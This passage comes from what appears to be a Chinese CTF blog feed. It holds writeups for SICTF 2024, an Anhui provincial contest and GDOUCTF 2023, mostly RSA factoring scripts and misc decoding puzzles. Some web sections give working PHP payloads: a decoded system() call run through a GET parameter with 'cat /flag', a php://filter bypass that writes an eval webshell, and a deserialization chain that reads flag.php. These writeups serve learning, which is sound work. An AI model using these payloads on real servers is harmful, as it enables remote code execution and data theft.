class="variable">$s</span>[<span class="number">89</span>] . <span class="variable">$s</span>[<span class="number">96</span>] . <span class="variable">$s</span>[<span class="number">60</span>] . <span class="variable">$s</span>[<span class="number">75</span>] . <span class="variable">$s</span>[<span class="number">108</span>] . <span class="variable">$s</span>[<span class="number">32</span>] . <span class="variable">$s</span>[<span class="number">107</span>] . <span class="variable">$s</span>[<span class="number">37</span>] . <span class="variable">$s</span>[<span class="number">131</span>] . <span class="variable">$s</span>[<span class="number">38</span>] . <span class="variable">$s</span>[<span class="number">25</span>] . <span class="variable">$s</span>[<span class="number">75</span>] . <span class="variable">$s</span>[<span class="number">100</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">68</span>] . <span class="variable">$s</span>[<span class="number">57</span>] . <span class="variable">$s</span>[<span class="number">11</span>] . <span class="variable">$s</span>[<span class="number">70</span>] . <span class="variable">$s</span>[<span class="number">77</span>] . <span class="variable">$s</span>[<span class="number">3</span>] . <span class="variable">$s</span>[<span class="number">3</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$s</span>[<span class="number">96</span>] . <span class="variable">$s</span>[<span class="number">89</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">62</span>] . <span class="variable">$s</span>[<span class="number">115</span>] . <span class="variable">$s</span>[<span class="number">74</span>] . <span class="variable">$s</span>[<span class="number">47</span>] . <span class="variable">$s</span>[<span class="number">47</span>];</span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$payload</span> = <span class="variable">$s</span>[<span class="number">115</span>].<span class="variable">$s</span>[<span class="number">65</span>].<span class="variable">$s</span>[<span class="number">86</span>].<span class="variable">$s</span>[<span class="number">39</span>].<span class="variable">$s</span>[<span class="number">70</span>].<span class="variable">$s</span>[<span class="number">4</span>].<span class="variable">$s</span>[<span class="number">108</span>].<span class="variable">$s</span>[<span class="number">124</span>].<span class="variable">$s</span>[<span class="number">26</span>].<span class="variable">$s</span>[<span class="number">65</span>].<span class="variable">$s</span>[<span class="number">16</span>].<span class="variable">$s</span>[<span class="number">116</span>].<span class="variable">$s</span>[<span class="number">115</span>].<span class="variable">$s</span>[<span class="number">103</span>].<span class="variable">$s</span>[<span class="number">98</span>].<span class="variable">$s</span>[<span class="number">77</span>].<span class="variable">$s</span>[<span class="number">92</span>].<span class="variable">$s</span>[<span class="number">48</span>].<span class="variable">$s</span>[<span class="number">12</span>].<span class="variable">$s</span>[<span class="number">44</span>].<span class="variable">$s</span>[<span class="number">115</span>].<span class="variable">$s</span>[<span class="number">62</span>].<span class="variable">$s</span>[<span class="number">58</span>].<span class="variable">$s</span>[<span class="number">55</span>].<span class="variable">$s</span>[<span class="number">92</span>].<span class="variable">$s</span>[<span class="number">37</span>].<span class="variable">$s</span>[<span class="number">55</span>].<span class="variable">$s</span>[<span class="number">40</span>].<span class="variable">$s</span>[<span class="number">116</span>].<span class="variable">$s</span>[<span class="number">71</span>].<span class="variable">$s</span>[<span class="number">16</span>].<span class="variable">$s</span>[<span class="number">83</span>].<span class="variable">$s</span>[<span class="number">92</span>].<span class="variable">$s</span>[<span class="number">48</span>].<span class="variable">$s</span>[<span class="number">75</span>].<span class="variable">$s</span>[<span class="number">23</span>].<span class="variable">$s</span>[<span class="number">5</span>].<span class="variable">$s</span>[<span class="number">74</span>].<span class="variable">$s</span>[<span class="number">47</span>].<span class="variable">$s</span>[<span class="number">47</span>];</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$g</span> = <span class="variable">$a</span>(<span class="variable">$a</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="variable">$h</span> = <span class="variable">$s</span>[<span class="number">17</span>].<span class="variable">$s</span>[<span class="number">130</span>].<span class="variable">$s</span>[<span class="number">106</span>].<span class="variable">$s</span>[<span class="number">76</span>].<span class="variable">$s</span>[<span class="number">113</span>].<span class="variable">$s</span>[<span class="number">68</span>].<span class="variable">$s</span>[<span class="number">75</span>].<span class="variable">$s</span>[<span class="number">109</span>].<span class="variable">$s</span>[<span class="number">55</span>].<span class="variable">$s</span>[<span class="number">65</span>].<span class="variable">$s</span>[<span class="number">26</span>].<span class="variable">$s</span>[<span class="number">47</span>];</span><br><span class="line"><span class="variable">$i</span> = <span class="variable">$a</span>(<span class="variable">$a</span>(<span class="variable">$h</span>));</span><br><span class="line"><span class="comment">//$i($f()[$a($c)][$g]); </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>,<span class="variable">$e</span>,<span class="variable">$f</span>,<span class="variable">$g</span>,<span class="variable">$h</span>,<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure>

<p>加密执行，解密以后是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">get_defined_vars</span>()[_GET][W3lc0me_t0_SICTF.<span class="number">2024</span>]);</span><br></pre></td></tr></table></figure>

<p>直接GET传参</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?W3lc0me[t0_SICTF.2024=cat /flag</span><br></pre></td></tr></table></figure>

<p>命令执行，这里.号属于特殊字符，用 [ 来绕过php7以下的变量名特殊字符自动转换</p>
<h3 id="Die-for-now"><a href="#Die-for-now" class="headerlink" title="Die for now"></a><strong>Die for now</strong></h3><p>看一眼</p>
<p><img src="/2024/11/06/SICTF-2024-round4/14.jpg" alt="img"></p>
<p>哈希长度扩展攻击，试一下</p>
<p>工具链接：<a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p>
<p>123.txt带出secret.php的值</p>
<p><img src="/2024/11/06/SICTF-2024-round4/15.jpg" alt="img"></p>
<p>传参</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hash=b7dd1b3c6b6dcc52a01f808e31e9d21c&amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAAAxW1sxMjMudHh0</span><br></pre></td></tr></table></figure>

<p>查看123.txt</p>
<p><img src="/2024/11/06/SICTF-2024-round4/16.png" alt="img"></p>
<p>死亡代码绕过</p>
<p>可以参考这篇博客：</p>
<p><a href="https://www.anquanke.com/post/id/202510#h3-18">探索php:&#x2F;&#x2F;filter在实战当中的奇技淫巧-安全客 - 安全资讯平台</a></p>
<p>Bypass</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>(); </span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+/../Qftm.php</span><br></pre></td></tr></table></figure>

<p>这里base64四位解码，直接破坏&lt;?等符号结构，绕过死亡代码后传马，命令执行</p>
<p>Payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hash=d698e9ead3bbf847e4b83c78731e7400&amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAAAxW1twaHA6Ly9maWx0ZXIvd3JpdGU9c3RyaW5nLnN0cmlwX3RhZ3N8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPT8+UEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzFGbWRHMWRLVDgrLy4uL1FmdG0ucGhw</span><br></pre></td></tr></table></figure>

<p> 访问Qftm.php，传参命令执行</p>
<p><img src="/2024/11/06/SICTF-2024-round4/17.jpg" alt="img"></p>
<h2 id="Crypto-3-4"><a href="#Crypto-3-4" class="headerlink" title="Crypto(3&#x2F;4)"></a><strong>Crypto(3&#x2F;4)</strong></h2><h3 id="SignBase"><a href="#SignBase" class="headerlink" title="SignBase"></a><strong>SignBase</strong></h3><p>简单题，base64解码拿flag</p>
<h3 id="Smooth"><a href="#Smooth" class="headerlink" title="Smooth"></a><strong>Smooth</strong></h3><p>看题目名和内容，应该是RSA p-1光滑，可以参考这篇文章</p>
<p><a href="https://blog.csdn.net/m0_62506844/article/details/125774485?app_version=6.3.8&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22125774485%22,%22source%22:%222301_80093366%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">RSA p+1或p-1光滑_p-1光滑数-CSDN博客</a></p>
<p>直接贴exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line">N = <span class="number">11353462911659482113796537452147300926058319193410149519981293344545095869273822230953023429933867057788424748612924709948861133348747189832397098293375764081790597820832766019459982124608221261607650511397189714784056313299551817534654742174637343804047231232241364089289257964139944018168155573510980260130960125621306919129390727418251555408239157881843225479158237727969284756513805560836003067115936987292751142016846824024901372913577548599978847860303760659677939193351221798796221804998385095596961591093782162020167439948314063423204757741472210008357888290333170757522814768955797167174930629344666183821709125207308525214263797625499327774875517941662523738827284067304929843343871569023248931759251331056863803201916908875256305736551124386988450879913404808869417817363510363373493093139804372817316366990863872781848240937733101758906281563575413208242901819275013539759479445299894840593737457394207415306989963459347994339058584475533786264375696277942369426844216474662828121334192775480587740071776080691560820922589751966526187341539255661442517814436944781114380877453502120302247547983180059537220197840688418898830571100216529994749464486853212098379822895838120836692532849021875818941979891105837972315129986493</span></span><br><span class="line">c = <span class="number">4598142980961588614870523368474306387497434303187254927457676265871592231881441246092917258758503624096206624791819316260705668875764048374035213672138915662719877795747211803584360349151646264274341548770123417923229997374982757324397146348908248704115062655445309042278469908831635522908894918382861563762003781223067210316435231509359575745828484177064520417698784251000631935361105284031848497200100561554984257265297077176545082009710252149167922123535451717313588884862304552508619154651546264753192894485610685402565486840707709012364088270364787452130288293053818329408433642977483320525542674345001200312959241276966417288770125166249156122793451000156544563900072606708005901579238109781720805374132101363788622676000360345128868422751829657184702090198806325558601552728909032627597688702884484377994243047876011323705947461799669488497113582621976154428096812072612119422667669321557427061098391558516935530727451865151957035156100271891977310043273298085691419672779758845492888551759393825925266903887942750052210444677062600227218953570162640164207895883301679126000642791876167281967081725589618329012476305157314322062703122134504285038691938912783524944917966615556902938825590064899700174139252191278691620663355243</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">    res = gmpy2.gcd(a-<span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,res)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(res-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#SICTF&#123;d8af7f58-49f7-490d-be49-386b8ff16361&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="next-prime"><a href="#next-prime" class="headerlink" title="next_prime"></a><strong>next_prime</strong></h3><p>解方程组，p q挨得很近，可以用费马分解</p>
<p>2021年“绿城杯”网络安全大赛-Crypto-RSA2-PLUS原题脚本能直接打</p>
<p>exp如下：</p>
<p>先分解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat_factorization</span>(<span class="params">n</span>):</span><br><span class="line">    factor_list = []</span><br><span class="line">    a = gmpy2.iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b2 = a * a - n</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> gmpy2.is_square(b2):</span><br><span class="line">            b2 = gmpy2.mpz(b2)</span><br><span class="line">            b, xflag = gmpy2.iroot(b2, <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">assert</span> xflag</span><br><span class="line">            factor_list.append([a + b, a - b])</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(factor_list) == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">143003048136494625720615623612005913472507924053937690079082986485649969355472743235179770036996193641198750946508667945561623931811236977039763581123681134310890547763107653222776992418543178066390387385209825190685606728024120446212807710589806258669458993047631033905702244902809204039169931629358263456702579067559691338668237882496453568585374905432631312417129535623987837367199215661733043851565981435234933986864857569158677737153423060041120732727135186371678287680926662892691327401787213342106281956461499522723795617869239148528294553548775690229067500104867437905746412645684721821428282431567702986879179533855920546700706123995719114359958306882907020982377260255340490340263938995699635287224549324332962230238510191824829224191551900441011605052418697617085549543103391184965537110312684637038510114533398510307173011690076219892318860903556489256383303693074652155424333388152193775840529985682153395008472897617946636734810609200156268438329402662168752285341847607694230848883249991722691539384542468611397615969487669898094687344847452861774236267516878551680397732564006255256825307533960791695267034807439791627895625581061889926276814228469856614838307012696777026973517086921078389474757196549594972814371353</span></span><br><span class="line"></span><br><span class="line">factor_list = fermat_factorization(n1)</span><br><span class="line">X1, Y1 = factor_list[<span class="number">0</span>]</span><br><span class="line">X2, Y2 = factor_list[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> X1 * Y1 == n1</span><br><span class="line"><span class="keyword">assert</span> X2 * Y2 == n1</span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(X1, X2)</span><br><span class="line">q = X1 // p</span><br><span class="line">p1 = gmpy2.gcd(Y1, Y2)</span><br><span class="line">q1 = Y1 // p1</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q =&#x27;</span>, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p1 =&#x27;</span>, p1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q1 =&#x27;</span>, q1)</span><br></pre></td></tr></table></figure>

<p>拿到两组p q，常规RSA解密，慢慢试，拿到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">q = <span class="number">113787980601251745826843877382579552614648689857848904057572059325440944465611640163147176996118167635079365778546506624499634252375260044431411000949865475313224316650494893792164068973839036934191662707067777255376224926590339831443832304095551258919095844512924220523460823214952758504127950314742622077043</span></span><br><span class="line">p = <span class="number">105093597128835439479657061236111691975605383355129363600351480053850707028369723338526666770974606911527798737164915958103082313581695026637245098382021718070694325314274439104912172972661654273602405666361761211778169903604127876997716201210879207713092042764119984813765613769539486499321202923341006511223</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">10602368727908312334676265892975307612231309319511015017178654564186172749979627738052483995870388025140270600159107954524376993980949045647370337520644299969292550299798129717198074042121264370311983929042594290226321121639097714569204574387632530578153623781118813035223106106430716561113649761388347227207862016222328885951443891878767280730866193302995220736592745950808566359750940949520997722511969961743175777398751576595421456387998438214806188903746057855596476380404784738717555105866919649086601807350830108805521710188675565963765427930594177874353694184805979235854934856122125278853834603734029710968348</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 40600296529065757616876034307502386207424439675894291036278463517602256790833</span></span><br><span class="line">n = q*p</span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line">d = gmpy2.invert(e, (p -<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=&quot;</span>,d)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;m=&quot;</span>,m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#SICTF&#123;f2a3af27-ad07-4fc2-9b69-a91304eee6a3&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>比赛writeup</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>misc</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>2024安徽省分布式</title>
    <url>/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="2024安徽省分布式"><a href="#2024安徽省分布式" class="headerlink" title="2024安徽省分布式"></a>2024安徽省分布式</h1><h2 id="Misc-2-4"><a href="#Misc-2-4" class="headerlink" title="Misc (2&#x2F;4)"></a>Misc (2&#x2F;4)</h2><h3 id="Jack"><a href="#Jack" class="headerlink" title="Jack"></a>Jack</h3><p>拿到压缩包，先解压文件，是一个文件夹，里面有434个文件，看一眼文件</p>
<p><img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/1.png" alt="图片1"></p>
<span id="more"></span>
<p>是个小作文，里面混杂着一串base64编码，考虑解密base64编码，其中一个文件就是flag，重命名所有文件，写一个python脚本，遍历文件，并提取base64编码解码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        encoded_data = f.read()</span><br><span class="line">        decoded_data = base64.b64decode(encoded_data)</span><br><span class="line">        <span class="keyword">return</span> decoded_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_files_in_folder</span>(<span class="params">folder_path</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(folder_path):</span><br><span class="line">        file_path = os.path.join(folder_path, filename)</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(file_path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                decoded_text = decode_base64(file_path)</span><br><span class="line">                <span class="built_in">print</span>(decoded_text)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error decoding <span class="subst">&#123;filename&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为你要遍历的文件夹路径</span></span><br><span class="line">folder_path = <span class="string">r&#x27;C:\Users\xtyy\Desktop\CTF\Jack\Jack&#x27;</span></span><br><span class="line">process_files_in_folder(folder_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第227个文件解码失败了，并且其他文件没有出flag，考虑比较特殊的编码，进去看看 <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/2.png" alt="图片2"></p>
<p>​       随波逐流一键解码，拿到flag，可以算是非预期吧</p>
<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/3.png" alt="3"></p>
<h3 id="paint"><a href="#paint" class="headerlink" title="paint"></a>paint</h3><p>拿到图片，提示是画图，010扫一眼文件末尾，冗余较大，复制下来，粘贴到文本文件中，像是16进制编码，赛博大厨解密一下</p>
<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/4.png" alt="4"></p>
<p>自动识别 </p>
<p>解出来像是(x,y)坐标</p>
<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/5.png" alt="5"></p>
<p>随波逐流文件操作，一把梭，生成二维码，扫码得到flag</p>
<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/6.png" alt="6"></p>
<h2 id="Crypto-3-4"><a href="#Crypto-3-4" class="headerlink" title="Crypto (3&#x2F;4)"></a>Crypto (3&#x2F;4)</h2><h3 id="enemy-command"><a href="#enemy-command" class="headerlink" title="enemy_command"></a>enemy_command</h3><p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/7.png" alt="7"></p>
<p>看一眼三个值46 45 32猜测摩斯密码，写个简单的脚本46转0，45转1，32转空格</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">45 45 45 45 45 32 45 46 46 45 32 45 45 46 46 46 32 46 46 46 45 45 32 45 45 46 46 46 32 45 45 45 45 46 32 45 46 46 46 46 32 46 32 45 45 46 46 46 32 46 46 46 46 45 32 45 45 46 46 46 32 45 46 46 46 32 45 46 46 46 46 32 46 45 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 32 46 46 46 46 45 32 46 32 46 46 46 46 46 32 45 46 46 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 46 32 45 45 46 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 46 32 46 46 46 45 45 32 45 45 45 45 45 32 46 46 46 46 45 32 46 46 45 45 45 32 45 46 46 46 46 32 46 46 46 45 45 32 45 46 46 46 46 32 46 45 45 45 45 32 45 45 46 46 46 32 45 46 46</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> text:</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot; &quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;6&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;0&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;5&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;3&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<p>11111 1001 11000 00011 11000 11110 10000 0 11000 00001 11000 1000 10000 01 00001 11100 00001 11100 00011 00011 10000 1000 00001 0 00000 10000 00001 100 00001 100 00000 11000 00011 00011 10000 10000 00011 11111 00001 00111 10000 00011 10000 01111 11000 100</p>
<p>摩斯密码解密：</p>
<p>0X73796E747B6A4848336B4E564D4D573366304263617D</p>
<p>0x开头应该是16进制</p>
<p>16进制解码：</p>
<p>synt{jHH3kNVMMW3f0Bca}</p>
<p>有flag雏形了，考虑是凯撒密码，随波逐流爆破：</p>
<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/9.png" alt="9"></p>
<p>拿到flag</p>
]]></content>
      <categories>
        <category>安徽省赛writeup</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>[GDOUCTF 2023]反方向的钟</title>
    <url>/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/</url>
    <content><![CDATA[<h1 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h1><h2 id="反序列化-原生类的利用"><a href="#反序列化-原生类的利用" class="headerlink" title="反序列化 + 原生类的利用"></a>反序列化 + 原生类的利用</h2><p>题目链接：<a href="https://www.nssctf.cn/problem/3723">https://www.nssctf.cn/problem/3723</a></p>
<span id="more"></span>
<p>拿到题目，先代码审计</p>
<p><img src="/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/1.png" alt="图片1">​</p>
<p>看了一下是反序列化攻击</p>
<p>直接分析代码，满足</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>语句</p>
<p>执行原生类，然后利用wakeup触发函数，到这里执行，直接贴exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>=<span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;name=<span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;rank=<span class="string">&#x27;department&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>-&gt;leader = <span class="variable">$p1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>= <span class="keyword">new</span> <span class="title function_ invoke__">school</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>-&gt;department = <span class="variable">$p2</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$p3</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后传入原生类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p>这里已经给出flag位置，SplFileObject只能读取单行，所以用伪协议读取全文，解密拿到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHANCiRmbGFnID0gIk5TU0NURnszMjVjODZhNS01M2VjLTRkMzctYTU4OC02MWRiOTVjYzg1NGR9IjsNCj8+DQo=</span><br></pre></td></tr></table></figure>

<p>$flag &#x3D; “NSSCTF{325c86a5-53ec-4d37-a588-61db95cc854d}”;</p>
]]></content>
      <categories>
        <category>日常writeup</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
</search>
